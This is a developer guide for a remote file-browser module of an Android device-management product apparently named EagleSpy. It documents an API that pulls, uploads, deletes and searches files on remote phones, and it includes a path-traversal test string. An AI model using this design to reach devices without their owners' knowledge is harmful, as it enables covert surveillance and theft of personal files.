# File Browser & Remote File Management - Implementation Guide

## Overview

Complete file browser system for EagleSpy V5 that enables remote file management on Android devices from the web dashboard. Supports listing, downloading, uploading, deleting, renaming, moving, searching, and previewing files.

## Architecture

### Components

1. **Backend API** (Rails)
   - Controller: `app/controllers/api/file_browser_controller.rb`
   - Service: `app/services/file_browser_service.rb`
   - Response Processor: `app/services/response_processors/file_browser_response_processor.rb`

2. **Android Client** (Kotlin)
   - Service: `android-client/.../services/FileBrowserService.kt`
   - Command Handler: `android-client/.../services/CommandService.kt`

3. **Frontend** (React - to be implemented)
   - Component: `app/javascript/components/FileBrowser.jsx`
   - File tree navigation
   - Upload/download UI
   - Preview modal

## API Reference

### Backend Endpoints

All endpoints are under `/api/smartphones/:smartphone_id/files`

#### 1. List Files
```
GET /api/smartphones/:smartphone_id/files
```

**Parameters:**
- `path` (string, optional): Directory path to list. Default: `/sdcard`
- `recursive` (boolean, optional): List files recursively. Default: `false`

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File listing command sent",
  "path": "/sdcard"
}
```

**Device Response (via ActionCable):**
```json
{
  "action": "list_files",
  "path": "/sdcard",
  "parent": "/storage/emulated/0",
  "entries": [
    {
      "name": "Download",
      "path": "/sdcard/Download",
      "is_directory": true,
      "size": 0,
      "size_readable": "0 B",
      "last_modified": 1234567890,
      "readable": true,
      "writable": true,
      "extension": ""
    }
  ],
  "count": 1
}
```

#### 2. Download File
```
GET /api/smartphones/:smartphone_id/files/download?path=/sdcard/file.txt
```

**Parameters:**
- `path` (string, required): Full path to file to download

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File download command sent"
}
```

**Device Response:**
```json
{
  "action": "download_file",
  "filename": "file.txt",
  "size": 1024,
  "content_base64": "base64_encoded_content"
}
```

**Note:** Files over 5MB will return an error. Chunked download support can be added in future.

#### 3. Upload File
```
POST /api/smartphones/:smartphone_id/files/upload
```

**Parameters:**
- `file` (file, required): File to upload
- `destination_path` (string, optional): Destination directory. Default: `/sdcard/Download`

**Response:**
```json
{
  "success": true,
  "filename": "uploaded_file.pdf",
  "size": 2048,
  "message": "File upload initiated"
}
```

**Note:** Files over 5MB automatically use chunked upload.

#### 4. Delete File
```
DELETE /api/smartphones/:smartphone_id/files?path=/sdcard/file.txt
```

**Parameters:**
- `path` (string, required): Path to file or directory to delete

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File deletion command sent"
}
```

#### 5. Preview File
```
GET /api/smartphones/:smartphone_id/files/preview?path=/sdcard/file.txt
```

**Parameters:**
- `path` (string, required): Path to file to preview

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File preview command sent"
}
```

**Device Response:**
```json
{
  "action": "preview_file",
  "filename": "file.txt",
  "content_type": "text/plain",
  "content": "file content or base64 for images",
  "size": 512
}
```

**Supported Preview Types:**
- Text files (txt, log, md, xml, json, html, css, js)
- Images (jpg, png, gif) - returned as base64
- PDFs - metadata only
- Max size: 1MB

#### 6. Rename File
```
POST /api/smartphones/:smartphone_id/files/rename
```

**Parameters:**
- `old_path` (string, required): Current file path
- `new_name` (string, required): New filename (not full path)

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File rename command sent"
}
```

#### 7. Move File
```
POST /api/smartphones/:smartphone_id/files/move
```

**Parameters:**
- `source_path` (string, required): Source file path
- `destination_path` (string, required): Destination directory or full path

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File move command sent"
}
```

#### 8. Search Files
```
GET /api/smartphones/:smartphone_id/files/search?query=photo&path=/sdcard
```

**Parameters:**
- `query` (string, required): Search query (case-insensitive)
- `path` (string, optional): Base directory to search. Default: `/sdcard`

**Response:**
```json
{
  "success": true,
  "request_id": "uuid",
  "message": "File search command sent",
  "query": "photo"
}
```

**Device Response:**
```json
{
  "action": "search_files",
  "query": "photo",
  "base_path": "/sdcard",
  "results": [
    {
      "name": "photo1.jpg",
      "path": "/sdcard/DCIM/photo1.jpg",
      "is_directory": false,
      "size": 2048000,
      "size_readable": "2 MB"
    }
  ],
  "count": 1
}
```

**Search Limits:**
- Max depth: 5 levels
- Max results: 100 files

## Security Considerations

### Path Traversal Prevention

**Backend (Rails):**
```ruby
def sanitize_path(path)
  # Remove null bytes
  clean_path = path.to_s.gsub("\0", '')
  
  # Remove consecutive slashes
  clean_path = clean_path.gsub(%r{/+}, '/')
  
  # Detect and reject path traversal attempts
  if clean_path.include?('../') || clean_path.include?('..\\')
    raise SecurityError, 'Path traversal attempt detected'
  end
  
  # Ensure path is absolute for Android
  clean_path = "/#{clean_path}" unless clean_path.start_with?('/')
  
  clean_path
end
```

**Android:**
```kotlin
// Always validate paths before operations
val file = File(path)
if (!file.canonicalPath.startsWith("/sdcard")) {
    throw SecurityException("Access denied")
}
```

### File Size Limits

- **Download:** 5MB per file (base64 encoded)
- **Upload:** 50MB maximum
- **Preview:** 1MB maximum
- **Chunked Transfer:** 5MB chunks

### Filename Sanitization

**Backend:**
```ruby
def sanitize_filename(filename)
  filename.to_s
          .gsub(%r{[/\\]}, '')  # Remove path separators
          .gsub(/[^\w\s.\-]/, '_')  # Replace special chars
          .strip[0..255]  # Limit length
end
```

### Permissions

**Android Manifest (required):**
```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
                 tools:ignore="ScopedStorage" />
```

**Runtime Permission Check:**
```kotlin
if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
    if (!Environment.isExternalStorageManager()) {
        // Request MANAGE_EXTERNAL_STORAGE permission
    }
}
```

### Consent Requirement

All file operations should require user consent. Check consent before executing:

```ruby
def check_file_access_consent
  consent = @smartphone.device_consents.find_by(consent_type: 'file_access')
  
  unless consent&.granted?
    render_error('File access consent not granted', :forbidden)
    return false
  end
  
  true
end
```

## Implementation Patterns

### Chunked Upload (Large Files)

**Backend Service:**
```ruby
def self.upload_file_chunked(smartphone, file, destination_path, upload_id)
  total_size = file.size
  total_chunks = (total_size.to_f / CHUNK_SIZE).ceil
  
  (0...total_chunks).each do |chunk_index|
    file.seek(chunk_index * CHUNK_SIZE)
    chunk_data = file.read(CHUNK_SIZE)
    encoded_chunk = Base64.strict_encode64(chunk_data)
    
    # Send chunk command
    send_command_async(smartphone, 'upload_file_chunk', {
      upload_id: upload_id,
      chunk_index: chunk_index,
      total_chunks: total_chunks,
      chunk_data: encoded_chunk
    })
  end
end
```

**Android Service:**
```kotlin
private fun uploadFileChunk(...) {
    val chunk = Base64.decode(chunkData, Base64.NO_WRAP)
    val chunkFile = File(tempDir, "chunk_$chunkIndex")
    chunkFile.writeBytes(chunk)
    
    // If last chunk, assemble file
    if (chunkIndex == totalChunks - 1) {
        assembleChunkedFile(uploadId, totalChunks, filename, destinationPath)
    }
}

private fun assembleChunkedFile(...) {
    FileOutputStream(destFile).use { output ->
        for (i in 0 until totalChunks) {
            val chunkFile = File(tempDir, "chunk_$i")
            FileInputStream(chunkFile).use { input ->
                input.copyTo(output)
            }
        }
    }
}
```

### Real-time Updates via ActionCable

**Backend Broadcasting:**
```ruby
ActionCable.server.broadcast(
  "file_browser_#{@smartphone.device_id}",
  {
    action: 'download_complete',
    filename: filename,
    size: size,
    path: path
  }
)
```

**Frontend Subscription (JavaScript):**
```javascript
const fileBrowserChannel = consumer.subscriptions.create(
  { channel: "FileBrowserChannel", device_id: deviceId },
  {
    received(data) {
      if (data.action === 'list_files') {
        updateFileTree(data.entries);
      } else if (data.action === 'download_complete') {
        showDownloadNotification(data.filename);
      }
    }
  }
);
```

### Error Handling

**Consistent Error Response Format:**
```json
{
  "success": false,
  "error": "File not found: /sdcard/missing.txt",
  "code": "FILE_NOT_FOUND"
}
```

**Android Error Handling:**
```kotlin
private fun sendErrorResponse(requestId: String?, error: String) {
    sendResponse(requestId, JSONObject().apply {
        put("success", false)
        put("error", error)
        put("timestamp", System.currentTimeMillis())
    })
}
```

## Testing

### Backend Tests (RSpec)

```ruby
# spec/controllers/api/file_browser_controller_spec.rb
RSpec.describe Api::FileBrowserController do
  describe 'GET #index' do
    it 'sends list_files command' do
      get :index, params: { smartphone_id: smartphone.id, path: '/sdcard' }
      expect(response).to have_http_status(:accepted)
      expect(PendingCommand.last.command).to eq('list_files')
    end
    
    it 'rejects path traversal attempts' do
      expect {
        get :index, params: { smartphone_id: smartphone.id, path: '../../../etc' }
      }.to raise_error(SecurityError)
    end
  end
end
```

### Integration Tests

```ruby
# spec/integration/file_browser_spec.rb
RSpec.describe 'File Browser Integration' do
  it 'completes file download workflow' do
    # 1. Send download command
    pending_command = FileBrowserController.new.download(smartphone, '/sdcard/test.txt')
    
    # 2. Simulate device response
    response_data = {
      'request_id' => pending_command.request_id,
      'filename' => 'test.txt',
      'content_base64' => Base64.encode64('test content')
    }
    
    ResponseProcessor.process(response_data)
    
    # 3. Verify file saved
    expect(File.exist?(Rails.root.join('files', 'downloads', smartphone.device_id, 'test.txt'))).to be true
  end
end
```

## Frontend Implementation (React)

### File Browser Component Structure

```
FileBrowser/
├── FileBrowser.jsx          # Main component
├── FileTree.jsx             # Tree navigation
├── FileList.jsx             # File list view
├── FilePreview.jsx          # Preview modal
├── FileUploader.jsx         # Upload interface
├── Breadcrumbs.jsx          # Navigation breadcrumbs
├── FileOperations.jsx       # Context menu operations
└── styles.css               # Component styles
```

### Example Component (FileBrowser.jsx)

```jsx
import React, { useState, useEffect } from 'react';
import FileTree from './FileTree';
import FileList from './FileList';
import FileUploader from './FileUploader';

function FileBrowser({ deviceId }) {
  const [currentPath, setCurrentPath] = useState('/sdcard');
  const [files, setFiles] = useState([]);
  const [loading, setLoading] = useState(false);

  const loadFiles = async (path) => {
    setLoading(true);
    try {
      const response = await fetch(
        `/api/smartphones/${deviceId}/files?path=${encodeURIComponent(path)}`
      );
      const data = await response.json();
      
      // Subscribe to ActionCable for response
      const channel = subscribeToFileBrowser(deviceId, (data) => {
        if (data.action === 'list_files') {
          setFiles(data.entries);
          setLoading(false);
        }
      });
    } catch (error) {
      console.error('Error loading files:', error);
      setLoading(false);
    }
  };

  useEffect(() => {
    loadFiles(currentPath);
  }, [currentPath, deviceId]);

  return (
    <div className="file-browser">
      <FileTree path={currentPath} onNavigate={setCurrentPath} />
      <FileList 
        files={files} 
        loading={loading}
        onNavigate={setCurrentPath}
      />
      <FileUploader 
        deviceId={deviceId} 
        currentPath={currentPath}
        onUploadComplete={() => loadFiles(currentPath)}
      />
    </div>
  );
}

export default FileBrowser;
```

## Performance Considerations

### Caching

File listings are cached for 10 minutes:
```ruby
cache_key = "file_listing:#{@smartphone.device_id}:#{path}"
Rails.cache.write(cache_key, data, expires_in: 10.minutes)
```

### Pagination

For directories with many files, limit results:
```kotlin
files?.take(MAX_ENTRIES)  // Limit to 500 files
```

### Lazy Loading

Load subdirectories only when expanded in the UI.

### Background Processing

For large file operations, use background jobs:
```ruby
FileBrowserUploadJob.perform_later(smartphone_id, file_path, destination)
```

## Troubleshooting

### Common Issues

**1. Permission Denied**
- Ensure MANAGE_EXTERNAL_STORAGE permission is granted
- Check scoped storage restrictions on Android 11+

**2. File Too Large**
- Use chunked upload for files > 5MB
- Increase chunk size if needed (trade-off: memory vs. speed)

**3. Path Traversal Errors**
- Validate all paths on both backend and Android
- Use canonical paths: `file.canonicalPath`

**4. Timeout Errors**
- Increase WebSocket timeout for large operations
- Implement retry logic with exponential backoff

### Debugging

**Enable verbose logging:**

Backend:
```ruby
Rails.logger.level = :debug
```

Android:
```kotlin
if (BuildConfig.DEBUG) {
    Log.d(TAG, "File operation: $command, path: $path")
}
```

## Future Enhancements

1. **Chunked Download:** Support downloading files > 5MB in chunks
2. **Zip/Unzip:** Compress multiple files for download
3. **File Permissions:** View and modify file permissions
4. **Symbolic Links:** Handle symbolic links properly
5. **File Metadata:** Extended attributes, MIME types
6. **Bulk Operations:** Delete, move multiple files at once
7. **Progress Tracking:** Real-time progress for long operations
8. **File Thumbnails:** Generate thumbnails for images/videos
9. **Cloud Integration:** Sync files to cloud storage
10. **File Versioning:** Track file changes over time

## License & Legal Notice

This implementation is part of EagleSpy V5 and subject to its license terms. Use responsibly and only with proper authorization and consent from device owners.

---

**Last Updated:** 2024-01-20  
**Version:** 1.0.0  
**Maintainer:** EagleSpy Development Team
